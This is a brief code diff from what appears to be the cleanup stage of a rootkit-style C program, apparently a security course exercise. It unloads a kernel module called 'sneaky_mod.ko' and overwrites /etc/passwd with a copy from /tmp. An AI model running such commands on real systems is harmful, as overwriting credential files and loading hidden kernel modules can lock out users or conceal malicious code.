@@ -17,6 +17,7 @@ int main() {
     }
     //unload module - rmmod
     system("rmmod sneaky_mod.ko");
+
     system("cp /tmp/passwd /etc/passwd");
 
     return EXIT_SUCCESS;
